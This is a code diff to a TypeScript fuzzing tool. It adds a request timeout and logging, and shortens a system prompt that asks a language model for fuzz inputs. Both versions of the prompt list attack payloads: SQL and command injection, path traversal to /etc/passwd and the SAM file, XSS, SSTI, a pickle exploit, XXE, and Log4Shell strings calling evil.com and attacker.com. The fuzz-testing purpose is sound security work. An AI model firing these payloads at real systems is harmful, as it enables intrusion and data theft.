@@ -46,7 +46,7 @@ function extractJSON(text: string): string {
     return cleaned.trim();
 }
 
-// Helper function to call secure backend API proxy
+// Helper function to call secure backend API proxy with timeout
 async function callMistralAPI(systemPrompt: string, userPrompt: string, responseFormat?: 'json', retryCount = 0): Promise<string> {
     console.log("🔧 callMistralAPI invoked with responseFormat:", responseFormat);
     
@@ -60,6 +60,10 @@ async function callMistralAPI(systemPrompt: string, userPrompt: string, response
     try {
         console.log("📤 Sending request to API proxy...");
         
+        // Add timeout wrapper (60 seconds)
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 60000);
+        
         const response = await fetch(API_PROXY_URL, {
             method: "POST",
             headers: {
@@ -69,9 +73,11 @@ async function callMistralAPI(systemPrompt: string, userPrompt: string, response
                 systemPrompt,
                 userPrompt,
                 responseFormat
-            })
+            }),
+            signal: controller.signal
         });
 
+        clearTimeout(timeoutId);
         console.log("📥 Response status:", response.status);
 
         // Handle rate limiting with exponential backoff
@@ -104,6 +110,12 @@ async function callMistralAPI(systemPrompt: string, userPrompt: string, response
         return data.content;
     } catch (error) {
         console.error("❌ API call failed:", error);
+        
+        // Handle timeout specifically
+        if (error instanceof Error && error.name === 'AbortError') {
+            throw new Error('API request timed out after 60 seconds. The request may be too complex.');
+        }
+        
         if (error instanceof Error) {
             throw new Error(`API Error: ${error.message}`);
         }
@@ -797,136 +809,44 @@ function detectLanguageFromCKG(ckgSummary: string): string {
     return 'JavaScript'; // Default fallback
 }
 
-const PROMPTFUZZ_PROMPT = `# ROLE & EXPERTISE
-You are a **Senior Exploit Developer & Fuzzing Specialist**, creator of custom AFL++ mutators with 10+ years discovering memory corruption bugs. Your fuzz input generation has uncovered CVEs in OpenSSL, libpng, and FFmpeg. You understand how parsers break, where type confusion occurs, and which edge cases crash programs.
+const PROMPTFUZZ_PROMPT = `# ROLE
+Senior Fuzzing Engineer - Generate 25-30 diverse fuzz inputs to trigger crashes.
 
-# SPECIALIZED KNOWLEDGE
-- Mutation strategies (bit flipping, arithmetic, havoc, splice)
-- Format-aware fuzzing (grammar-based, structure-aware)
-- Exploit primitives (heap feng shui, ROP chains, info leaks)
-- Sanitizer triggering (ASan, UBSan, MSan patterns)
-- Language-specific attack vectors
+# ATTACK TYPES
+1. **Boundary**: "", null, 0, -1, 2147483647, "A"*10000, NaN, Infinity
+2. **Injection**: ' OR '1'='1, ; ls, {"$gt":""}, %s%s%s, <script>alert(1)</script>
+3. **Path**: ../../../etc/passwd, ..%252f, /etc/passwd%00
+4. **Overflow**: "A"*1024, "X"*8192, "Aa0Aa1..."
+5. **Encoding**: \u0000, %20, %2F, VGVzdA==, %2541
+6. **Language-Specific**:
+   - JS: {"__proto__":{"isAdmin":true}}, (a+)+b, [], NaN
+   - Python: {{7*7}}, __import__('os')
+   - Java: \${jndi:ldap://evil.com/a}
 
-# INPUT GENERATION PHILOSOPHY
-**Every input should stress-test a different failure mode.**
+# OUTPUT
+Return 25-30 raw fuzz inputs, one per line. NO explanations.
 
-Goals:
-1. **Trigger boundary conditions** (min/max values, empty inputs, huge inputs)
-2. **Exploit type confusion** (wrong types, mixed encodings)
-3. **Break parsers** (malformed formats, truncated data)
-4. **Cause memory errors** (buffer overflows, use-after-free)
-5. **Abuse business logic** (negative values, out-of-order operations)
-
-# 6-CATEGORY ATTACK VECTOR FRAMEWORK
-
-## CATEGORY 1: Boundary Value Testing
-- **Empty inputs**: "", [], {}, null, undefined
-- **Single character**: "a", "0", " "
-- **Very long strings**: "A" * 10000, "A" * 100000
-- **Max integers**: 2147483647, 9223372036854775807
-- **Min integers**: -2147483648, -9223372036854775808
-- **Zero**: 0, 0.0, -0
-- **Special floats**: NaN, Infinity, -Infinity
-
-## CATEGORY 2: Format String & Injection Payloads
-- **Format strings**: %s%s%s%s, %x%x%x%x, %n%n%n%n, %p%p%p%p
-- **SQL injection**: ' OR '1'='1, '; DROP TABLE users;--, admin'--
-- **Command injection**: ; ls -la, | cat /etc/passwd, \`whoami\`
-- **NoSQL injection**: {"$gt":""}, {"$ne":null}
-- **LDAP injection**: *)(uid=*))(|(uid=*
-- **XPath injection**: ' or '1'='1, '] | //user/*[contains(*,'
-
-## CATEGORY 3: Path Traversal & File System Attacks
-- **Relative paths**: ../../../etc/passwd, ..\\..\\..\\windows\\system32\\config\\sam
-- **Absolute paths**: /etc/passwd, C:\\Windows\\System32\\config\\SAM
-- **Null bytes**: /etc/passwd%00.jpg, file.txt\x00.png
-- **Double encoding**: %252e%252e%252f, %2e%2e%5c
-- **Unicode tricks**: ..%c0%af, ..%c1%9c
-
-## CATEGORY 4: Buffer Overflow Patterns
-- **Long repetitions**: "A" * 1024, "X" * 8192, "Z" * 65536
-- **Cyclical patterns**: "Aa0Aa1Aa2Aa3..." (metasploit pattern_create)
-- **Null terminators**: "test\x00\x00\x00more_data"
-- **Format specifiers**: "%s" * 1000
-- **Nested structures**: "{{{{{{{{{{{{{" or "[[[[[[[[[[[[["
-
-## CATEGORY 5: Type Confusion & Encoding Attacks
-- **Mixed types**: [1, "string", null, {}, true]
-- **Wrong types**: Sending object where string expected, array where int expected
-- **Encoding variations**:
-  - URL encoding: %20, %2F, %3C, %3E
-  - Base64: VGVzdA==, dGVzdA==
-  - Unicode: \u0041, \xc2\xa9, \u2028, \u2029
-  - Double encoding: %2541 (encodes to %41)
-  - UTF-8 overlong: \xc0\x80 (null byte)
-- **Case manipulation**: TEST, test, TeSt
-- **Special characters**: \r\n, \t, \b, \f, \v
-
-## CATEGORY 6: Language-Specific Attack Vectors
-
-### JavaScript/TypeScript
-- **Prototype pollution**: {"__proto__":{"isAdmin":true}}
-- **ReDoS**: (a+)+b with "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
-- **Type coercion**: [], {}, NaN, "0", 0, false
-- **eval injection**: "__import__('os').system('ls')"
-
-### Python
-- **Pickle exploits**: b"cos\nsystem\n(S'ls'\ntR."
-- **SSTI**: {{7*7}}, {{config.items()}}, {{request.application.__globals__}}
-- **Command injection**: __import__('os').system('cat /etc/passwd')
-
-### C/C++
-- **Format strings**: %n, %x, %s, %p
-- **Integer overflow**: 4294967295 + 1
-- **Buffer overflow**: "A" * 10000
-- **Null pointer dereference**: Pass null/nullptr
-
-### Java
-- **Deserialization**: Gadget chains (Commons Collections)
-- **XXE**: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-- **Log4Shell**: \${jndi:ldap://attacker.com/a}
-
-# OUTPUT REQUIREMENTS
-Generate **20-30 diverse test inputs** (raw data, no explanations):
-- 5 boundary value tests
-- 5 injection payloads
-- 3 path traversal attempts
-- 3 buffer overflow patterns
-- 4 encoding variations
-- Language-specific attacks based on target functions
-
-**Format**: One input per line. Mix attack categories. NO explanations.
-
-Example output:
-\`\`\`
+Example:
 
 ' OR '1'='1
 {"__proto__":{"isAdmin":true}}
 ../../../etc/passwd
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-%s%s%s%s%s%s%s%s%s%s
+AAAAAAAAAAAAAAAAAAAA
+%s%s%s%s%s
 0
 -2147483648
-{"$gt":""}
 ; ls -la
-<script>alert(1)</script>
 \${jndi:ldap://evil.com/a}
-..%252f..%252f..%252fetc%252fpasswd
-\`\`\`
-
-# CRITICAL CONSTRAINTS
-- **NO explanations** - raw inputs only
-- Tailor inputs to target functions (if function parses JSON, generate malformed JSON)
-- Include language-specific payloads
-- Mix simple and complex attack vectors
-- Each input should test a different failure mode
 `;
 
 export async function generatePromptFuzzInputs(fuzzTargets: FuzzTarget[]): Promise<string> {
+    console.log("💉 generatePromptFuzzInputs called with", fuzzTargets.length, "targets");
     const userPrompt = `Fuzz Targets:\n---\n${fuzzTargets.map(t => `- ${t.functionName}: ${t.reasoning}`).join('\n')}\n---`;
     
     try {
+        console.log("📤 Requesting PromptFuzz generation from API...");
         const responseText = await callMistralAPI(PROMPTFUZZ_PROMPT, userPrompt);
+        console.log("📥 PromptFuzz response received, length:", responseText.length);
         
         // Check if response is empty or invalid
         if (!responseText || responseText.trim().length < 10) {
@@ -934,6 +854,7 @@ export async function generatePromptFuzzInputs(fuzzTargets: FuzzTarget[]): Promi
             return generateDefaultFuzzInputs(fuzzTargets);
         }
         
+        console.log("✅ PromptFuzz generation successful");
         return responseText;
     } catch (error) {
         console.warn("⚠️ Failed to generate PromptFuzz inputs with AI, using default payload set");
